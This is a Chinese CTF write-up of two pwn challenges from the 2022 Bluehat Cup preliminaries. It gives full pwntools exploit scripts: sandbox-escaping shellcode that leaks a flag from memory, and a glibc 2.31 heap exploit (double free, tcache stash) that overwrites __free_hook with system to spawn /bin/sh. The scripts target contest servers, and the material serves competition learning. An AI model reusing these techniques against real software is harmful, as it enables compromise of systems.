---
layout: article
pageview: true
key: 2022-07-12-bluehat2022-pwn-wp
title: 蓝帽杯2022Pwn题WP
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---

<!--more-->
## 初赛

初赛名次16名，还算不错

### EscapeShellcode

题目将flag内容读到bss段上后就关闭了文件并且进入了沙盒，沙盒中只允许read和write，加载沙盒后就可以执行输入在堆上的shellcode了。

执行shellcode前会将除了rip外的所有寄存器设为`0xdeadbeefdeadbeef`，这样我们就不能使用`push pop call`等汇编指令。

由于堆地址和bss段地址偏移范围相对固定，我们可以先用`lea`指令获取当前堆地址，然后向bss段大致跳转一次，然后输出所在位置的内容，再向前跳转0x1000，如此循环往复，就可以输出bss段上的flag内容

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64')
context.log_level='debug'

_elf='./escape_shellcode'
_libc=''
_addr='47.94.194.27'
_port=43341

local=0

def getConn():
    if local==1:
        return process(_elf)
    else:
        return remote(_addr,_port)

def debug(p,cmd=None):
    if local==1:
        gdb.attach(p,cmd)
    pause()


p=getConn()
# pause()
debug(p,'b *$rebase(0x1367)')

shellcode="""
lea rbx, [rip-0xb1]
sub rbx,0x2a0
add rbx,0x120
sub rbx,0x100000

find_flag:
sub rbx,0x1000

print_flag:
mov rdi,1
xor rsi,rsi
add rsi,rbx
mov rdx,0x80
mov rax,1
syscall
jmp find_flag
"""

payload=asm(shellcode)
p.sendline(payload)
p.interactive()
#flag{9436fc2d-a75e-4da5-a4bd-71b6c9f6ef5d}
```

### Bank

题目环境`libc-2.31`，可以泄露任意堆上的内容，可以任意free地址，每次可申请0x18大小的堆，可以realloc大小小于0x100的堆。

每次操作需要花费钱，我们初始有0x190的钱，需要存钱后通过转钱来操作堆，不过在存钱取钱的函数中存在逻辑漏洞，可以无限刷钱，这样就可以无限堆操作了。

在2.31环境中，我们可以利用`fastbin doublefree&tcache stach`来打free_hook。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64')
#context.log_level='debug'

_elf='./Bank'
_libc='./libc-2.31.so'
_addr='39.107.108.120'
_port=38779

local=0

def getConn():
    if local==1:
        return process(_elf)
    else:
        return remote(_addr,_port)

def debug(p,cmd=None):
    if local==1:
        gdb.attach(p,cmd)
    pause()

def cmd(idx):
    if idx==0:
        p.sendlineafter('Click: ','Quit')
    if idx==2:
        p.sendlineafter('Click: ','Deposit')
    if idx==3:
        p.sendlineafter('Click: ','Transfer')
    if idx==4:
        p.sendlineafter('Click: ','Put')
    if idx==5:
        p.sendlineafter('Click: ','Login')
    if idx==6:
        p.sendlineafter('Click: ','Info')

def deposit(num):
    cmd(2)
    p.sendlineafter('How Much? ',str(num))

def put(num):
    cmd(4)
    p.sendlineafter('How Much? ',str(num))

def info():
    cmd(6)

def login(card,pwd):
    cmd(5)
    p.sendlineafter('Card Numbers: ',str(card))
    p.sendlineafter('Password: ',str(pwd))

def t2admin(num):
    cmd(3)
    p.sendlineafter('who? ','admin')
    p.sendlineafter('How much? ',str(num))

def t2hacker(num,ptr):
    cmd(3)
    p.sendlineafter('who? ','hacker')
    p.sendlineafter('How much? ',str(num))
    p.sendlineafter('Great!',str(ptr))

def t2guest(num,data):
    cmd(3)
    p.sendlineafter('who? ','guest')
    p.sendlineafter('How much? ',str(num))
    p.sendafter('data: ',data)

def t2ghost(num,size):
    cmd(3)
    p.sendlineafter('who? ','ghost')
    p.sendlineafter('How much? ',str(num))
    p.sendlineafter(':)\n',str(size))

def t2abyss(num,data):
    cmd(3)
    p.sendlineafter('who? ','abyss')
    p.sendlineafter('How much? ',str(num))
    p.sendline(str(data))


libc=ELF(_libc)
p=getConn()
login(1111111111,111111)
put(0x190)
for i in range(0x10):
    deposit(0x190)
for i in range(0x10):
    put(0x190)


for i in range(0x10):
    t2guest(6,'a'*0x10)

t2ghost(0xa+1,0x20)
for i in range(0x20):
    t2guest(6,'b'*0x10)
t2ghost(0xa+1,0x30)
t2admin(0x4a-5)

p.recvuntil('I think ')
heap_addr=int(p.recv(14),16)
log.info(hex(heap_addr))

for i in range(7):
   t2hacker(0x33,heap_addr+0x2b0+0x20*i)

t2hacker(0x33,heap_addr+0x2b0+0x20*7)
t2hacker(0x33,heap_addr+0x2b0+0x20*8)
t2hacker(0x33,heap_addr+0x2b0+0x20*7)

for i in range(0x7):
    t2guest(6,'c'*0x10)

t2guest(6,p64(heap_addr+0x2b0+0x20*9-0x10))
t2guest(6,'c'*0x10)
t2guest(6,'c'*0x10)
t2guest(6,p64(0)+p64(0x431))

t2hacker(0x33, heap_addr+0x3d0)
t2admin(0x140/8)

p.recvuntil('I think ')
libc_base=int(p.recv(14),16)-libc.sym['__malloc_hook']-0x10-96
log.info(hex(libc_base))

t2guest(6,'/bin/sh\x00')

for i in range(7):
   t2hacker(0x33,heap_addr+0x2b0+0x20*i)

t2hacker(0x33,heap_addr+0x2b0+0x20*7)
t2hacker(0x33,heap_addr+0x2b0+0x20*8)
t2hacker(0x33,heap_addr+0x2b0+0x20*7)

for i in range(0x7):
    t2guest(6,'d'*0x10)
t2guest(6,p64(libc_base+libc.sym['__free_hook']))
t2guest(6,'d'*0x10)
t2guest(6,'d'*0x10)

t2guest(6,p64(libc_base+libc.sym['system']))

t2hacker(0x33,heap_addr+0x3d0)



p.interactive()

#flag{5ca01d35-f295-4813-9244-8588cb3c65bd}
```